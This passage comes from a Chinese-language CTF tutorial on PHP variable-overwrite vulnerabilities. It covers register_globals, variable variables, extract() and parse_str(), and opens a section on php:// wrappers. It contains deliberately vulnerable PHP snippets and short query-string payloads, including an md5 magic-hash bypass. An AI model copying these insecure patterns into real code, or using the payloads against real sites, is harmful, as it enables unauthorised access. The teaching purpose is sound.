+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1"></a><span class="x">register_globals=ON</span>
+</code></pre></div></td></tr></table></div>
+<p>如果传入一个参数 <strong>?id=1</strong>，并且这个参数把原有的变量值给覆盖掉了则叫做 <strong>变量覆盖漏洞</strong>，举个例子</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-34-1">1</a></span>
+<span class="normal"><a href="#__codelineno-34-2">2</a></span>
+<span class="normal"><a href="#__codelineno-34-3">3</a></span>
+<span class="normal"><a href="#__codelineno-34-4">4</a></span>
+<span class="normal"><a href="#__codelineno-34-5">5</a></span>
+<span class="normal"><a href="#__codelineno-34-6">6</a></span>
+<span class="normal"><a href="#__codelineno-34-7">7</a></span>
+<span class="normal"><a href="#__codelineno-34-8">8</a></span>
+<span class="normal"><a href="#__codelineno-34-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-34-2" name="__codelineno-34-2"></a><span class="nv">$flag</span> <span class="o">=</span> <span class="s2">&quot;flag{Chain!}&quot;</span><span class="p">;</span>
+<a id="__codelineno-34-3" name="__codelineno-34-3"></a><span class="nv">$a</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="p">;</span>
+<a id="__codelineno-34-4" name="__codelineno-34-4"></a><span class="nv">$b</span> <span class="o">=</span> <span class="s2">&quot;B&quot;</span><span class="p">;</span>
+<a id="__codelineno-34-5" name="__codelineno-34-5"></a><span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$a</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<a id="__codelineno-34-6" name="__codelineno-34-6"></a><span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$b</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<a id="__codelineno-34-7" name="__codelineno-34-7"></a><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;get&#39;</span><span class="p">];</span>  <span class="c1"># $a 变量被我们传入的get给覆盖掉了</span>
+<a id="__codelineno-34-8" name="__codelineno-34-8"></a><span class="k">echo</span> <span class="nv">$a</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<a id="__codelineno-34-9" name="__codelineno-34-9"></a><span class="k">echo</span> <span class="nv">$b</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</code></pre></div></td></tr></table></div>
+<p><img alt="image-20250131153329727" src="../assets/image-20250131153329727.png" /></p>
+<p>上面程序返回如下</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-35-1">1</a></span>
+<span class="normal"><a href="#__codelineno-35-2">2</a></span>
+<span class="normal"><a href="#__codelineno-35-3">3</a></span>
+<span class="normal"><a href="#__codelineno-35-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1"></a>a:A
+<a id="__codelineno-35-2" name="__codelineno-35-2"></a>b:B
+<a id="__codelineno-35-3" name="__codelineno-35-3"></a>a:
+<a id="__codelineno-35-4" name="__codelineno-35-4"></a>b:B
+</code></pre></div></td></tr></table></div>
+<p>传入参数：<strong>?get=Genshin</strong>，返回</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-36-1">1</a></span>
+<span class="normal"><a href="#__codelineno-36-2">2</a></span>
+<span class="normal"><a href="#__codelineno-36-3">3</a></span>
+<span class="normal"><a href="#__codelineno-36-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1"></a>a:A
+<a id="__codelineno-36-2" name="__codelineno-36-2"></a>b:B
+<a id="__codelineno-36-3" name="__codelineno-36-3"></a>a:Genshin
+<a id="__codelineno-36-4" name="__codelineno-36-4"></a>b:B
+</code></pre></div></td></tr></table></div>
+<p>可以发现，<strong>$a</strong> 变量被我们传进去的 <strong>get 参数</strong> 给覆盖了</p>
+<p>漏洞产生原因</p>
+<ul>
+<li>register_globals（全局变量）为 On</li>
+<li><code>$$</code> 使用不恰当</li>
+<li>extract() 函数使用不当</li>
+<li>parse_str() 使用不当</li>
+<li>import_request_variables() 使用不当</li>
+</ul>
+<h4 id="_12">$$<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
+<p><code>$$</code>（可变变量 - https://www.php.net/manual/zh/language.variables.variable.php）
+简单概括就是一个可变变量获得了一个普通变量的值并作为这个可变变量的变量名</p>
+<ul>
+<li>$ - 普通变量，$a = 1</li>
+<li><code>$$</code> - 引用变量，普通变量的值，<code>$$b = "B"</code></li>
+</ul>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-37-1">1</a></span>
+<span class="normal"><a href="#__codelineno-37-2">2</a></span>
+<span class="normal"><a href="#__codelineno-37-3">3</a></span>
+<span class="normal"><a href="#__codelineno-37-4">4</a></span>
+<span class="normal"><a href="#__codelineno-37-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1"></a>$a = &quot;A&quot;;
+<a id="__codelineno-37-2" name="__codelineno-37-2"></a>$$a = &quot;B&quot;;
+<a id="__codelineno-37-3" name="__codelineno-37-3"></a>echo $a . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-37-4" name="__codelineno-37-4"></a>echo $$a . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-37-5" name="__codelineno-37-5"></a>echo $Ice . &quot;&lt;br&gt;&quot;;
+</code></pre></div></td></tr></table></div>
+<p>返回</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-38-1">1</a></span>
+<span class="normal"><a href="#__codelineno-38-2">2</a></span>
+<span class="normal"><a href="#__codelineno-38-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1"></a>A
+<a id="__codelineno-38-2" name="__codelineno-38-2"></a>B
+<a id="__codelineno-38-3" name="__codelineno-38-3"></a>B
+</code></pre></div></td></tr></table></div>
+<p>如果使用 foreach 来遍历数组的值，举个例子</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-39-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-39-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-39-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-39-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-39-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-39-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-39-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-39-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-39-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-39-10">10</a></span>
+<span class="normal"><a href="#__codelineno-39-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1"></a>$a = &quot;A&quot;; #
+<a id="__codelineno-39-2" name="__codelineno-39-2"></a>$b = &quot;B&quot;; # 注意这俩
+<a id="__codelineno-39-3" name="__codelineno-39-3"></a>echo $a . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-39-4" name="__codelineno-39-4"></a>echo $b . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-39-5" name="__codelineno-39-5"></a>foreach ($_GET as $key =&gt; $value) {
+<a id="__codelineno-39-6" name="__codelineno-39-6"></a>    $$key = $value;
+<a id="__codelineno-39-7" name="__codelineno-39-7"></a>}
+<a id="__codelineno-39-8" name="__codelineno-39-8"></a>echo $a . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-39-9" name="__codelineno-39-9"></a>echo $b . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-39-10" name="__codelineno-39-10"></a>echo $key . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-39-11" name="__codelineno-39-11"></a>echo $$key . &quot;&lt;br&gt;&quot;;
+</code></pre></div></td></tr></table></div>
+<p>上面这个例子，直接运行返回如下</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-40-1">1</a></span>
+<span class="normal"><a href="#__codelineno-40-2">2</a></span>
+<span class="normal"><a href="#__codelineno-40-3">3</a></span>
+<span class="normal"><a href="#__codelineno-40-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1"></a>A
+<a id="__codelineno-40-2" name="__codelineno-40-2"></a>B
+<a id="__codelineno-40-3" name="__codelineno-40-3"></a>A
+<a id="__codelineno-40-4" name="__codelineno-40-4"></a>B
+</code></pre></div></td></tr></table></div>
+<p>接着我们传入几个数据，如</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-41-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1"></a>?a=I&#39;m A&amp;b=I&#39;m B
+</code></pre></div></td></tr></table></div>
+<p>最终返回如下</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-42-1">1</a></span>
+<span class="normal"><a href="#__codelineno-42-2">2</a></span>
+<span class="normal"><a href="#__codelineno-42-3">3</a></span>
+<span class="normal"><a href="#__codelineno-42-4">4</a></span>
+<span class="normal"><a href="#__codelineno-42-5">5</a></span>
+<span class="normal"><a href="#__codelineno-42-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1"></a>A
+<a id="__codelineno-42-2" name="__codelineno-42-2"></a>B
+<a id="__codelineno-42-3" name="__codelineno-42-3"></a>I&#39;m A
+<a id="__codelineno-42-4" name="__codelineno-42-4"></a>I&#39;m B
+<a id="__codelineno-42-5" name="__codelineno-42-5"></a>b
+<a id="__codelineno-42-6" name="__codelineno-42-6"></a>I&#39;m B
+</code></pre></div></td></tr></table></div>
+<p>会发现<code>$a</code>和<code>$b</code>值被修改了，这是因为我们使用了 foreach 来遍历数组的值，上面有一句 <code>$$key = $value;</code>这句的意思是将获取到的数组键名（<code>$_GET</code>）作为变量，那么数组中的键值将作为变量的值。</p>
+<p>上面传进去的参数可以看作，只需把 <code>$_GET</code> 替换成 <code>$array</code> 即可</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-43-1">1</a></span>
+<span class="normal"><a href="#__codelineno-43-2">2</a></span>
+<span class="normal"><a href="#__codelineno-43-3">3</a></span>
+<span class="normal"><a href="#__codelineno-43-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1"></a>$array = array(
+<a id="__codelineno-43-2" name="__codelineno-43-2"></a>    &#39;a&#39;=&gt;&#39;I\&#39;m A&#39;,
+<a id="__codelineno-43-3" name="__codelineno-43-3"></a>    &#39;b&#39;=&gt;&#39;I\&#39;m B&#39;
+<a id="__codelineno-43-4" name="__codelineno-43-4"></a>);
+</code></pre></div></td></tr></table></div>
+<p>来道题</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-44-1">1</a></span>
+<span class="normal"><a href="#__codelineno-44-2">2</a></span>
+<span class="normal"><a href="#__codelineno-44-3">3</a></span>
+<span class="normal"><a href="#__codelineno-44-4">4</a></span>
+<span class="normal"><a href="#__codelineno-44-5">5</a></span>
+<span class="normal"><a href="#__codelineno-44-6">6</a></span>
+<span class="normal"><a href="#__codelineno-44-7">7</a></span>
+<span class="normal"><a href="#__codelineno-44-8">8</a></span>
+<span class="normal"><a href="#__codelineno-44-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1"></a>$flag = &quot;flag{Chain!}&quot;;
+<a id="__codelineno-44-2" name="__codelineno-44-2"></a>foreach ($_GET as $key =&gt; $value) {
+<a id="__codelineno-44-3" name="__codelineno-44-3"></a>    $$key = $value;
+<a id="__codelineno-44-4" name="__codelineno-44-4"></a>}
+<a id="__codelineno-44-5" name="__codelineno-44-5"></a>if ($id === &quot;admin&quot;) {
+<a id="__codelineno-44-6" name="__codelineno-44-6"></a>    echo $flag;
+<a id="__codelineno-44-7" name="__codelineno-44-7"></a>}else{
+<a id="__codelineno-44-8" name="__codelineno-44-8"></a>    echo &quot;Out!&quot;;
+<a id="__codelineno-44-9" name="__codelineno-44-9"></a>}
+</code></pre></div></td></tr></table></div>
+<p>Payload: <strong>?id=admin</strong></p>
+<h4 id="extract">extract()<a class="headerlink" href="#extract" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>https://www.php.net/extract</p>
+</blockquote>
+<p>描述：extract(<strong>array</strong>,<strong>flags</strong>,<strong>prefix</strong>)</p>
+<ul>
+<li><strong>array</strong>：数组</li>
+<li><strong>flags</strong>：</li>
+<li><strong>EXTR_OVERWRITE</strong> - 如果有冲突，覆盖已有的变量。<strong>（默认）</strong>
+  <strong>EXTR_SKIP</strong> - 如果有冲突，不覆盖已有的变量。
+  <strong>EXTR_PREFIX_SAME</strong> - 如果有冲突，在变量名前加上前缀 prefix。<strong>（需要第 prefix 参数）</strong></li>
+<li>…</li>
+<li><strong>prefix</strong>：该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。
+  extract 用来将变量从数组中导入到当前的符号表中，并返回成功导入到符号表中的变量数目</li>
+</ul>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-45-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-45-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-45-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-45-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-45-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-45-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-45-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-45-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-45-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-45-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1"></a>$a = &quot;Source&quot;;
+<a id="__codelineno-45-2" name="__codelineno-45-2"></a>$array = array(
+<a id="__codelineno-45-3" name="__codelineno-45-3"></a>    &quot;a&quot;=&gt;&quot;JP&quot;,
+<a id="__codelineno-45-4" name="__codelineno-45-4"></a>    &quot;b&quot;=&gt;&quot;RU&quot;,
+<a id="__codelineno-45-5" name="__codelineno-45-5"></a>    &quot;c&quot;=&gt;&quot;US&quot;,
+<a id="__codelineno-45-6" name="__codelineno-45-6"></a>);
+<a id="__codelineno-45-7" name="__codelineno-45-7"></a>extract($array);
+<a id="__codelineno-45-8" name="__codelineno-45-8"></a>echo &quot;\$a = &quot; . $a . &quot;&lt;br&gt;&quot;; # 注意这里，a原本是有内容的
+<a id="__codelineno-45-9" name="__codelineno-45-9"></a>echo &quot;\$b = &quot; . $b . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-45-10" name="__codelineno-45-10"></a>echo &quot;\$c = &quot; . $c . &quot;&lt;br&gt;&quot;;
+</code></pre></div></td></tr></table></div>
+<p>返回</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-46-1">1</a></span>
+<span class="normal"><a href="#__codelineno-46-2">2</a></span>
+<span class="normal"><a href="#__codelineno-46-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1"></a>$a = JP
+<a id="__codelineno-46-2" name="__codelineno-46-2"></a>$b = RU
+<a id="__codelineno-46-3" name="__codelineno-46-3"></a>$c = US
+</code></pre></div></td></tr></table></div>
+<p>接着将第二个参数改为 <strong>EXTR_PREFIX_SAME</strong>，并将 <strong>prefix</strong> 设置为 <strong>fix</strong></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-47-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-47-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-47-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-47-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-47-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-47-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-47-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-47-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-47-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-47-10">10</a></span>
+<span class="normal"><a href="#__codelineno-47-11">11</a></span>
+<span class="normal"><a href="#__codelineno-47-12">12</a></span>
+<span class="normal"><a href="#__codelineno-47-13">13</a></span>
+<span class="normal"><a href="#__codelineno-47-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1"></a>$a = &quot;Source&quot;;
+<a id="__codelineno-47-2" name="__codelineno-47-2"></a>$c = &quot;Source1&quot;;
+<a id="__codelineno-47-3" name="__codelineno-47-3"></a>$array = array(
+<a id="__codelineno-47-4" name="__codelineno-47-4"></a>    &quot;a&quot;=&gt;&quot;JP&quot;,
+<a id="__codelineno-47-5" name="__codelineno-47-5"></a>    &quot;b&quot;=&gt;&quot;RU&quot;,
+<a id="__codelineno-47-6" name="__codelineno-47-6"></a>    &quot;c&quot;=&gt;&quot;US&quot;
+<a id="__codelineno-47-7" name="__codelineno-47-7"></a>);
+<a id="__codelineno-47-8" name="__codelineno-47-8"></a>extract($array, EXTR_PREFIX_SAME, &quot;fix&quot;);
+<a id="__codelineno-47-9" name="__codelineno-47-9"></a>echo &quot;\$a = &quot; . $a . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-47-10" name="__codelineno-47-10"></a>echo &quot;\$b = &quot; . $b . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-47-11" name="__codelineno-47-11"></a>echo &quot;\$c = &quot; . $c . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-47-12" name="__codelineno-47-12"></a>echo &quot;\$fix_a = &quot; . $fix_a . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-47-13" name="__codelineno-47-13"></a>echo &quot;\$fix_b = &quot; . $fix_b . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-47-14" name="__codelineno-47-14"></a>echo &quot;\$fix_c = &quot; . $fix_c . &quot;&lt;br&gt;&quot;;
+</code></pre></div></td></tr></table></div>
+<p>返回</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-48-1">1</a></span>
+<span class="normal"><a href="#__codelineno-48-2">2</a></span>
+<span class="normal"><a href="#__codelineno-48-3">3</a></span>
+<span class="normal"><a href="#__codelineno-48-4">4</a></span>
+<span class="normal"><a href="#__codelineno-48-5">5</a></span>
+<span class="normal"><a href="#__codelineno-48-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1"></a>$a = Source
+<a id="__codelineno-48-2" name="__codelineno-48-2"></a>$b = RU
+<a id="__codelineno-48-3" name="__codelineno-48-3"></a>$c = Source1
+<a id="__codelineno-48-4" name="__codelineno-48-4"></a>$fix_a = JP
+<a id="__codelineno-48-5" name="__codelineno-48-5"></a>$fix_b =
+<a id="__codelineno-48-6" name="__codelineno-48-6"></a>$fix_c = US
+</code></pre></div></td></tr></table></div>
+<p>如果 extract 第二参数未设置，并且用户输入了带值的参数，例子</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-49-1">1</a></span>
+<span class="normal"><a href="#__codelineno-49-2">2</a></span>
+<span class="normal"><a href="#__codelineno-49-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1"></a>extract($_GET);
+<a id="__codelineno-49-2" name="__codelineno-49-2"></a>echo $v1 . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-49-3" name="__codelineno-49-3"></a>echo $v2 . &quot;&lt;br&gt;&quot;;
+</code></pre></div></td></tr></table></div>
+<p>输入 <strong>?v1=Hello&amp;v2=World</strong> 返回</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-50-1">1</a></span>
+<span class="normal"><a href="#__codelineno-50-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1"></a>Hello
+<a id="__codelineno-50-2" name="__codelineno-50-2"></a>World
+</code></pre></div></td></tr></table></div>
+<p>来道例题</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-51-1">1</a></span>
+<span class="normal"><a href="#__codelineno-51-2">2</a></span>
+<span class="normal"><a href="#__codelineno-51-3">3</a></span>
+<span class="normal"><a href="#__codelineno-51-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1"></a>extract($_GET);
+<a id="__codelineno-51-2" name="__codelineno-51-2"></a>if ($pass == &quot;admin&quot;) {
+<a id="__codelineno-51-3" name="__codelineno-51-3"></a>    echo $flag;
+<a id="__codelineno-51-4" name="__codelineno-51-4"></a>}
+</code></pre></div></td></tr></table></div>
+<p>Payload: <strong>?pass=admin</strong>
+漏洞应用：ThinkPHP 5.x 版本，详见：<a href="https://hyasin.github.io/2020/09/08/ThinkPHP漏洞分析/">ThinkPHP 漏洞分析总结（主要 RCE 和文件 | Hyasin's blog</a></p>
+<h4 id="parse_str">parse_str()<a class="headerlink" href="#parse_str" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>https://www.php.net/manual/zh/function.parse-str.php</p>
+</blockquote>
+<p>描述：parse_str(<strong>str</strong>)用于将字符串解析成多个变量，没有返回值\</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-52-1">1</a></span>
+<span class="normal"><a href="#__codelineno-52-2">2</a></span>
+<span class="normal"><a href="#__codelineno-52-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1"></a>parse_str(&quot;username=A&amp;password=123456&quot;);
+<a id="__codelineno-52-2" name="__codelineno-52-2"></a>echo &quot;Username: &quot; . $username . &quot;&lt;br&gt;&quot;;
+<a id="__codelineno-52-3" name="__codelineno-52-3"></a>echo &quot;Password: &quot; . $password;
+</code></pre></div></td></tr></table></div>
+<p>输出</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-53-1">1</a></span>
+<span class="normal"><a href="#__codelineno-53-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1"></a>Username: A
+<a id="__codelineno-53-2" name="__codelineno-53-2"></a>Password: 123456
+</code></pre></div></td></tr></table></div>
+<p>原本这个函数有 array 参数的，但在 7.2 后废除了，array 变量会以数组元素的形式存入到这个数组，作为替代</p>
+<p>来到例题</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-54-1">1</a></span>
+<span class="normal"><a href="#__codelineno-54-2">2</a></span>
+<span class="normal"><a href="#__codelineno-54-3">3</a></span>
+<span class="normal"><a href="#__codelineno-54-4">4</a></span>
+<span class="normal"><a href="#__codelineno-54-5">5</a></span>
+<span class="normal"><a href="#__codelineno-54-6">6</a></span>
+<span class="normal"><a href="#__codelineno-54-7">7</a></span>
+<span class="normal"><a href="#__codelineno-54-8">8</a></span>
+<span class="normal"><a href="#__codelineno-54-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1"></a>$UIUCTF = &quot;UIUCTF Hacker.&quot;;
+<a id="__codelineno-54-2" name="__codelineno-54-2"></a>$id = $_GET[&#39;id&#39;];
+<a id="__codelineno-54-3" name="__codelineno-54-3"></a>@parse_str($id);
+<a id="__codelineno-54-4" name="__codelineno-54-4"></a>if ($a[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) == md5(&#39;QNKCDZO&#39;)) {
+<a id="__codelineno-54-5" name="__codelineno-54-5"></a>    echo $flag;
+<a id="__codelineno-54-6" name="__codelineno-54-6"></a>}else{
+<a id="__codelineno-54-7" name="__codelineno-54-7"></a>    echo &quot;Out!&quot;;
+<a id="__codelineno-54-8" name="__codelineno-54-8"></a>}
+<a id="__codelineno-54-9" name="__codelineno-54-9"></a>#QNKCDZO = 0e830400451993494058024219903391
+</code></pre></div></td></tr></table></div>
+<p>注意第四行，和前面的 md5 比较有关系，但不同的是这里加入了 <strong>parse_str</strong> 这个函数，这段代码大致意思就和上面 md5 绕过的意思一样，如果 md5 编码后的哈希值时 <strong>0e</strong> （科学计数法）开头的，都一律解释为 0，所以当两个不同的值经过哈希编码后他们的值都是以 <strong>0e</strong> 开头的，则每个值都是 <strong>0</strong>，与众不同的是我们要覆盖掉 <strong>a[0]</strong> 这个变量</p>
+<p>Payload: <strong>?id=a[0]=240610708</strong></p>
+<h4 id="register_globals">register_globals<a class="headerlink" href="#register_globals" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>https://php.net/manual/zh/ini.core.php#ini.register-globals</p>
+</blockquote>
+<p><strong>register_globals</strong> 设置为 on 的时候，传递的参数会 <strong>自动注册</strong> 为全局变量。</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-55-1">1</a></span>
+<span class="normal"><a href="#__codelineno-55-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1"></a>ini_set(&quot;register_globals&quot;, &quot;On&quot;);
+<a id="__codelineno-55-2" name="__codelineno-55-2"></a>echo $a;
+</code></pre></div></td></tr></table></div>
+<p><img alt="img" src="../assets/da88d2-71be8a-78805a221a988e79ef3f42d7.png" /></p>
+<p>来个例子。。</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-56-1">1</a></span>
+<span class="normal"><a href="#__codelineno-56-2">2</a></span>
+<span class="normal"><a href="#__codelineno-56-3">3</a></span>
+<span class="normal"><a href="#__codelineno-56-4">4</a></span>
+<span class="normal"><a href="#__codelineno-56-5">5</a></span>
+<span class="normal"><a href="#__codelineno-56-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1"></a>$flag = &quot;flag{REAL_FLAG}&quot;;
+<a id="__codelineno-56-2" name="__codelineno-56-2"></a>if ($_POST[&quot;getout&quot;]==1 ){
+<a id="__codelineno-56-3" name="__codelineno-56-3"></a>    echo $flag;
+<a id="__codelineno-56-4" name="__codelineno-56-4"></a>} else {
+<a id="__codelineno-56-5" name="__codelineno-56-5"></a>    echo &quot;Out!&quot;;
+<a id="__codelineno-56-6" name="__codelineno-56-6"></a>}
+</code></pre></div></td></tr></table></div>
+<p>Payload: <strong>getout=1</strong>（POST）</p>
+<h4 id="import_request_variables">import_request_variables<a class="headerlink" href="#import_request_variables" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>import_request_variables</p>
+<p>import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</p>
+</blockquote>
+<p>注意：'import_request_variables' 已在 PHP 5.4 版本中被移除</p>
+<p>这里就不写了，网上自己搜教程</p>
+<h3 id="_13">伪协议<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<p>先了解下 php://</p>
+<blockquote>
+<p>php:// — 访问各个输入/输出流（I/O streams）</p>
+<p>https://www.php.net/manual/zh/wrappers.php.php</p>
+</blockquote>
+<p><strong>说明：</strong>
+PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，
+内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 <strong>php.ini</strong> 中的配置：</p>
+<ul>
+<li>在 allow_url_fopen，allow_url_include 都关闭的情况下可以正常使用 php://作用为访问输入输出流</li>
+</ul>
+<p>跟会读取文件内容的函数使用，如：<strong>include</strong>、<strong>include_once</strong>、<strong>require</strong>、<strong>require_once</strong>、<strong>file_get_contents</strong></p>
